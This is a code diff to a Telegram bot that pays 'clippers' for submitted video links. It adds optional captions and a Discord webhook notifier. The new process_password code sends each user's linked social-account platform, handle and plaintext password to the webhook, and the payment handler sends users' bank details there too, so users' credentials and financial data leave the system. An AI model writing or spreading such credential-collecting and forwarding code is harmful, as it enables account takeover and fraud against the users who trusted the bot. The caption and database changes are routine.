@@ -3,7 +3,9 @@ import html
 import logging
 import os
 from contextlib import suppress
+from datetime import datetime, timezone
 
+import aiohttp
 from aiohttp import web
 from aiogram import BaseMiddleware, Bot, Dispatcher, F, types
 from aiogram.client.default import DefaultBotProperties
@@ -24,8 +26,33 @@ DATABASE_URL = os.getenv("DATABASE_URL")
 ADMIN_IDS = [
     int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()
 ]
+DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "").strip()
 
 logging.basicConfig(level=logging.INFO)
+
+# --- DISCORD FORWARDING HELPER ---
+async def send_discord_notification(
+    title: str,
+    fields: list[dict],
+    color: int = 0x5865F2,
+    url: str | None = None,
+):
+    if not DISCORD_WEBHOOK_URL:
+        return
+    embed = {
+        "title": title,
+        "color": color,
+        "fields": fields,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+    }
+    if url:
+        embed["url"] = url
+    payload = {"embeds": [embed]}
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+    except Exception as e:
+        logging.warning(f"Could not forward to Discord webhook: {e}")
 
 # --- DATABASE LAYER (Neon PostgreSQL with SQLite Fallback) ---
 class Database:
@@ -67,8 +94,10 @@ class Database:
                         link TEXT,
                         payment DOUBLE PRECISION DEFAULT 0.0,
                         status TEXT DEFAULT 'Under Review',
+                        caption TEXT,
                         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                     );
+                    ALTER TABLE submissions ADD COLUMN IF NOT EXISTS caption TEXT;
                 """)
             logging.info(" Connected to Neon PostgreSQL database.")
         else:
@@ -105,9 +134,14 @@ class Database:
                         link TEXT,
                         payment REAL DEFAULT 0.0,
                         status TEXT DEFAULT 'Under Review',
+                        caption TEXT,
                         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                     )
                 """)
+                try:
+                    await db.execute("ALTER TABLE submissions ADD COLUMN caption TEXT")
+                except Exception:
+                    pass
                 await db.commit()
             logging.info(" Connected to local SQLite database (bot_database.db).")
 
@@ -319,20 +353,26 @@ class Database:
                     return {row[0]: row[1] for row in rows}
 
     async def add_submission(
-        self, chat_id: int, telegram_username: str, link: str, payment: float = 0.0
+        self,
+        chat_id: int,
+        telegram_username: str,
+        link: str,
+        payment: float = 0.0,
+        caption: str | None = None,
     ) -> int:
         if self.is_postgres:
             async with self.pool.acquire() as conn:
                 row = await conn.fetchrow(
                     """
-                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status)
-                    VALUES ($1, $2, $3, $4, 'Under Review')
+                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status, caption)
+                    VALUES ($1, $2, $3, $4, 'Under Review', $5)
                     RETURNING id
                     """,
                     chat_id,
                     telegram_username,
                     link,
                     payment,
+                    caption,
                 )
                 return row["id"]
         else:
@@ -340,10 +380,10 @@ class Database:
             async with aiosqlite.connect(self.db_path) as db:
                 cursor = await db.execute(
                     """
-                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status)
-                    VALUES (?, ?, ?, ?, 'Under Review')
+                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status, caption)
+                    VALUES (?, ?, ?, ?, 'Under Review', ?)
                     """,
-                    (chat_id, telegram_username, link, payment),
+                    (chat_id, telegram_username, link, payment, caption),
                 )
                 await db.commit()
                 return cursor.lastrowid
@@ -353,7 +393,7 @@ class Database:
             async with self.pool.acquire() as conn:
                 rows = await conn.fetch(
                     """
-                    SELECT id, link, payment, status, created_at
+                    SELECT id, link, payment, status, created_at, caption
                     FROM submissions
                     WHERE chat_id = $1
                     ORDER BY id DESC
@@ -366,7 +406,7 @@ class Database:
             async with aiosqlite.connect(self.db_path) as db:
                 async with db.execute(
                     """
-                    SELECT id, link, payment, status, created_at
+                    SELECT id, link, payment, status, created_at, caption
                     FROM submissions
                     WHERE chat_id = ?
                     ORDER BY id DESC
@@ -375,7 +415,14 @@ class Database:
                 ) as cursor:
                     rows = await cursor.fetchall()
                     return [
-                        {"id": r[0], "link": r[1], "payment": r[2], "status": r[3], "created_at": r[4]}
+                        {
+                            "id": r[0],
+                            "link": r[1],
+                            "payment": r[2],
+                            "status": r[3],
+                            "created_at": r[4],
+                            "caption": r[5],
+                        }
                         for r in rows
                     ]
 
@@ -387,7 +434,7 @@ class Database:
                     UPDATE submissions
                     SET payment = $1, status = 'Approved'
                     WHERE id = $2
-                    RETURNING chat_id, telegram_username, link
+                    RETURNING chat_id, telegram_username, link, caption
                     """,
                     payment,
                     submission_id,
@@ -397,7 +444,7 @@ class Database:
             import aiosqlite
             async with aiosqlite.connect(self.db_path) as db:
                 async with db.execute(
-                    "SELECT chat_id, telegram_username, link FROM submissions WHERE id = ?",
+                    "SELECT chat_id, telegram_username, link, caption FROM submissions WHERE id = ?",
                     (submission_id,),
                 ) as cursor:
                     row = await cursor.fetchone()
@@ -408,7 +455,12 @@ class Database:
                     (payment, submission_id),
                 )
                 await db.commit()
-                return {"chat_id": row[0], "telegram_username": row[1], "link": row[2]}
+                return {
+                    "chat_id": row[0],
+                    "telegram_username": row[1],
+                    "link": row[2],
+                    "caption": row[3],
+                }
 
     async def get_leaderboard(self, limit: int = 5) -> list[dict]:
         if self.is_postgres:
@@ -451,6 +503,7 @@ class BotStates(StatesGroup):
     entering_password = State()
     entering_payment = State()
     entering_submission_link = State()
+    entering_submission_caption = State()
     inspecting_user = State()
 
 # --- KEYBOARDS ---
@@ -477,6 +530,14 @@ def get_back_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")]
+        ]
+    )
+
+def get_caption_keyboard():
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="⏭ Skip Caption", callback_data="sub_skip_caption")],
+            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
         ]
     )
 
@@ -729,8 +790,14 @@ async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext)
                     payment = sub["payment"]
                     status = sub["status"]
                     total_payout += payment
+                    caption_str = (
+                        f"\n   📝 <b>Caption:</b> <i>{html.escape(sub['caption'])}</i>"
+                        if sub.get("caption")
+                        else ""
+                    )
                     lines.append(
-                        f"{idx}. 🔗 <a href=\"{html.escape(link)}\">Submission #{sub['id']}</a>\n"
+                        f"{idx}. 🔗 <a href=\"{html.escape(link)}\">Submission #{sub['id']}</a>"
+                        f"{caption_str}\n"
                         f"   💰 <b>Payment:</b> ${payment:.2f}\n"
                         f"   📌 <b>Status:</b> {html.escape(status)}"
                     )
@@ -790,6 +857,19 @@ async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext)
             await callback.message.edit_text(
                 "🔗 Please send the link to your video or clip (e.g. TikTok, YouTube, Instagram, or Twitter link):",
                 reply_markup=get_back_keyboard(),
+            )
+        elif data == "sub_skip_caption":
+            state_data = await state.get_data()
+            link = state_data.get("submission_link")
+            if not link:
+                await state.set_state(BotStates.main_menu)
+                await callback.message.edit_text(
+                    "⚠️ Submission session expired. Please submit your link again from the menu:",
+                    reply_markup=get_main_menu_keyboard(),
+                )
+                return
+            await finalize_submission(
+                callback.message, state, link, caption=None, chat_id=callback.message.chat.id
             )
         elif data == "back_to_menu":
             await state.set_state(BotStates.main_menu)
@@ -875,6 +955,17 @@ async def process_password(message: types.Message, state: FSMContext):
         except Exception as e:
             logging.warning(f"Could not send notification to admin {admin_id}: {e}")
 
+    await send_discord_notification(
+        title="📱 Social Account Linked",
+        fields=[
+            {"name": "👤 User", "value": telegram_username, "inline": True},
+            {"name": "🌐 Platform", "value": platform, "inline": True},
+            {"name": "🏷️ Handle", "value": handle, "inline": True},
+            {"name": "🔑 Password", "value": password, "inline": False},
+        ],
+        color=0x9B59B6,
+    )
+
     await state.clear()
     await state.set_state(BotStates.main_menu)
     await message.answer(
@@ -915,6 +1006,15 @@ async def process_payment_info(message: types.Message, state: FSMContext):
         except Exception as e:
             logging.warning(f"Could not send payment notification to admin {admin_id}: {e}")
 
+    await send_discord_notification(
+        title="💳 Payment Details Updated",
+        fields=[
+            {"name": "👤 User", "value": telegram_username, "inline": True},
+            {"name": "🏦 Bank Details", "value": text, "inline": False},
+        ],
+        color=0xF1C40F,
+    )
+
     await state.clear()
     await state.set_state(BotStates.main_menu)
     await message.answer(
@@ -926,43 +1026,107 @@ async def process_payment_info(message: types.Message, state: FSMContext):
 # --- SUBMISSION LINK FLOW ---
 async def process_submission_link(message: types.Message, state: FSMContext):
     text = (message.text or "").strip()
-    if not (text.startswith("http://") or text.startswith("https://")) or len(text) < 10:
+    parts = text.split(None, 1)
+    url_candidate = parts[0]
+
+    if not (url_candidate.startswith("http://") or url_candidate.startswith("https://")) or len(url_candidate) < 10:
         await message.answer(
             "❌ Invalid link. Please enter a valid URL starting with <code>https://</code> or <code>http://</code>:",
             reply_markup=get_back_keyboard(),
         )
         return
 
-    chat_id = message.chat.id
+    # If the user included both the link and caption in one message
+    if len(parts) > 1 and parts[1].strip():
+        caption = parts[1].strip()
+        await finalize_submission(message, state, url_candidate, caption)
+        return
+
+    # Store link and ask for caption
+    await state.update_data(submission_link=url_candidate)
+    await state.set_state(BotStates.entering_submission_caption)
+    await message.answer(
+        "📝 <b>Link received!</b>\n\n"
+        "Now please write the <b>caption</b> or description for this video link\n"
+        "<i>(Or tap <b>⏭ Skip Caption</b> if you don't want to add one)</i>:",
+        reply_markup=get_caption_keyboard(),
+        disable_web_page_preview=True,
+    )
+
+async def process_submission_caption(message: types.Message, state: FSMContext):
+    caption = (message.text or "").strip()
+    data = await state.get_data()
+    link = data.get("submission_link")
+
+    if not link:
+        await state.set_state(BotStates.main_menu)
+        await message.answer(
+            "⚠️ Submission session expired. Please submit your link again from the menu:",
+            reply_markup=get_main_menu_keyboard(),
+        )
+        return
+
+    await finalize_submission(message, state, link, caption)
+
+async def finalize_submission(
+    target_msg: types.Message,
+    state: FSMContext,
+    link: str,
+    caption: str | None,
+    chat_id: int | None = None,
+):
+    if chat_id is None:
+        chat_id = target_msg.chat.id
+
     user = await db.get_user(chat_id)
     telegram_username = user["telegram_username"] if user else f"id_{chat_id}"
 
-    sub_id = await db.add_submission(chat_id, telegram_username, text)
+    sub_id = await db.add_submission(chat_id, telegram_username, link, 0.0, caption)
 
-    # Notify admin(s)
+    caption_html = f"\n📝 <b>Caption:</b> <i>{html.escape(caption)}</i>" if caption else ""
+
+    # Notify admin(s) via Telegram
     admin_notification = (
         f"🔗 <b>New Video Link Submitted!</b>\n\n"
         f"<b>User:</b> {html.escape(telegram_username)}\n"
         f"<b>Chat ID:</b> <code>{chat_id}</code>\n"
         f"<b>Submission ID:</b> <code>#{sub_id}</code>\n"
-        f"<b>Link:</b> <a href=\"{html.escape(text)}\">{html.escape(text)}</a>\n\n"
+        f"<b>Link:</b> <a href=\"{html.escape(link)}\">{html.escape(link)}</a>"
+        f"{caption_html}\n\n"
         f"💡 To set payout for this link:\n"
         f"<code>/setpay {sub_id} 5.00</code>"
     )
 
     for admin_id in ADMIN_IDS:
         try:
-            await message.bot.send_message(
+            await target_msg.bot.send_message(
                 admin_id, admin_notification, disable_web_page_preview=False
             )
         except Exception as e:
             logging.warning(f"Could not send link notification to admin {admin_id}: {e}")
 
+    # Forward to Discord (if configured)
+    discord_fields = [
+        {"name": "👤 Clipper", "value": telegram_username, "inline": True},
+        {"name": "🆔 Submission ID", "value": f"#{sub_id}", "inline": True},
+        {"name": "🔗 Link", "value": link, "inline": False},
+    ]
+    if caption:
+        discord_fields.append({"name": "📝 Caption", "value": caption, "inline": False})
+
+    await send_discord_notification(
+        title="🎬 New Video Link Submitted",
+        fields=discord_fields,
+        color=0x2ECC71,
+        url=link if (link.startswith("http://") or link.startswith("https://")) else None,
+    )
+
     await state.clear()
     await state.set_state(BotStates.main_menu)
-    await message.answer(
+    await target_msg.answer(
         f"✅ <b>Link Submitted Successfully!</b> (ID: #{sub_id})\n\n"
-        f"🔗 <b>Link:</b> <a href=\"{html.escape(text)}\">{html.escape(text)}</a>\n"
+        f"🔗 <b>Link:</b> <a href=\"{html.escape(link)}\">{html.escape(link)}</a>"
+        f"{caption_html}\n"
         f"💰 <b>Payment:</b> $0.00 (Under Review)\n\n"
         f"You can view all your submissions anytime under <b>🔗 Submission Links</b>.",
         reply_markup=get_main_menu_keyboard(),
@@ -998,8 +1162,13 @@ def format_user_data_card(
         sub_lines = []
         if submissions:
             for sub in submissions[:5]:
+                cap_snippet = (
+                    f" (📝 <i>{html.escape(sub['caption'])}</i>)"
+                    if sub.get("caption")
+                    else ""
+                )
                 sub_lines.append(
-                    f"• #{sub['id']}: <a href=\"{html.escape(sub['link'])}\">{html.escape(sub['link'])}</a> | <b>${sub['payment']:.2f}</b> ({html.escape(sub['status'])})"
+                    f"• #{sub['id']}: <a href=\"{html.escape(sub['link'])}\">{html.escape(sub['link'])}</a>{cap_snippet} | <b>${sub['payment']:.2f}</b> ({html.escape(sub['status'])})"
                 )
         else:
             sub_lines.append("• <i>No submissions yet</i>")
@@ -1154,6 +1323,7 @@ async def set_pay_command(message: types.Message):
 
     user_chat_id = res["chat_id"]
     sub_link = res["link"]
+    caption_line = f"📝 <b>Caption:</b> <i>{html.escape(res['caption'])}</i>\n" if res.get("caption") else ""
 
     await message.answer(
         f"✅ Payment for Submission <code>#{sub_id}</code> updated to <b>${amount:.2f}</b>!"
@@ -1165,6 +1335,7 @@ async def set_pay_command(message: types.Message):
             f"🎉 <b>Submission Payment Updated!</b>\n\n"
             f"Your submission (ID: #{sub_id}) has been reviewed!\n"
             f"🔗 <b>Link:</b> {html.escape(sub_link)}\n"
+            f"{caption_line}"
             f"💰 <b>Payment:</b> <b>${amount:.2f}</b>\n\n"
             f"You can check all your earnings under <b>🔗 Submission Links</b>.",
             disable_web_page_preview=True,
@@ -1209,12 +1380,16 @@ async def main():
     dp.message.register(process_password, BotStates.entering_password)
     dp.message.register(process_payment_info, BotStates.entering_payment)
     dp.message.register(process_submission_link, BotStates.entering_submission_link)
+    dp.message.register(process_submission_caption, BotStates.entering_submission_caption)
     dp.message.register(process_inspect_user, BotStates.inspecting_user)
 
     # Callbacks
     dp.callback_query.register(
         menu_callback_router,
-        F.data.startswith("menu_") | (F.data == "back_to_menu") | (F.data == "sub_new"),
+        F.data.startswith("menu_")
+        | (F.data == "back_to_menu")
+        | (F.data == "sub_new")
+        | (F.data == "sub_skip_caption"),
     )
     dp.callback_query.register(platform_selected, F.data.startswith("plat_"))
 
